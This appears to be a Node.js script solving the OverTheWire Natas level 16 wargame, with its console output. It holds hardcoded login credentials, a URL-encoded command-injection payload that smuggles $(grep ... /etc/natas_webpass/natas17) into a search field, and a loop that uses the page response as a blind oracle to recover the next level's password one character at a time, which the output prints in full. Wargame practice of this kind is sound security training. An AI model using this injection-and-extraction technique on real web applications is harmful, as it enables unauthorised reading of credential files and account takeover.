const express = require('express');
const axios = require('axios');
const app = express();
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'));

const headers = {
    'Authorization': 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=='
}
async function req(ch) {
    const res = await axios.get(`http://natas16.natas.labs.overthewire.org/?needle=submit%24%28grep+-e+%5E${ch}+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search`, {headers});
    if(res.data.includes('resubmitting')) {
        return false;
    } else {
        return true;
    }
}

async function calc() {
    const alphanum = 'QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890';
    let ans = '';
    
    for(let i=0; i<alphanum.length; i++) {
        let val = await req(ans + alphanum[i]);
        if(val) {
            ans += alphanum[i];
            console.log(ans);
            i = -1;
        }
    }
    console.log('fin');
}

calc();

app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));

// Outputs:
// Example app listening at http://localhost:3000
// 8
// 8P
// 8Ps
// 8Ps3
// 8Ps3H
// 8Ps3H0
// 8Ps3H0G
// 8Ps3H0GW
// 8Ps3H0GWb
// 8Ps3H0GWbn
// 8Ps3H0GWbn5
// 8Ps3H0GWbn5r
// 8Ps3H0GWbn5rd
// 8Ps3H0GWbn5rd9
// 8Ps3H0GWbn5rd9S
// 8Ps3H0GWbn5rd9S7
// 8Ps3H0GWbn5rd9S7G
// 8Ps3H0GWbn5rd9S7Gm
// 8Ps3H0GWbn5rd9S7GmA
// 8Ps3H0GWbn5rd9S7GmAd
// 8Ps3H0GWbn5rd9S7GmAdg
// 8Ps3H0GWbn5rd9S7GmAdgQ
// 8Ps3H0GWbn5rd9S7GmAdgQN
// 8Ps3H0GWbn5rd9S7GmAdgQNd
// 8Ps3H0GWbn5rd9S7GmAdgQNdk
// 8Ps3H0GWbn5rd9S7GmAdgQNdkh
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhP
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
// 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
// fin